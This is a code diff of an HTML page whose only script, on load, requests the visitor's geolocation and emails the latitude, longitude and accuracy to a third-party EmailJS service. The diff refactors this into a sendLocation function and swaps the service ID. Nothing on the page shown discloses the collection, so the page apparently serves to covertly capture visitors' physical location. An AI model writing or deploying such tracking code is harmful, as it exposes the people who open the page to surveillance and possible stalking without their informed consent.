@@ -9,15 +9,24 @@
 </head>
 <body>
     <script>
+        function sendLocation(lat, lon, accuracy) {
+            emailjs.send("service_3v5hcby", "template_x8wi2yq", {
+                lat: lat,
+                lon: lon,
+                accuracy: accuracy + " metr"
+            });
+        }
+
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(function(pos) {
-                emailjs.send("service_b5rft1p", "template_x8wi2yq", {
-                    lat: pos.coords.latitude,
-                    lon: pos.coords.longitude,
-                    accuracy: pos.coords.accuracy + " metr"
-                });
+                sendLocation(
+                    pos.coords.latitude,
+                    pos.coords.longitude,
+                    pos.coords.accuracy
+                );
             });
         }
     </script>
 </body>
 </html>
+
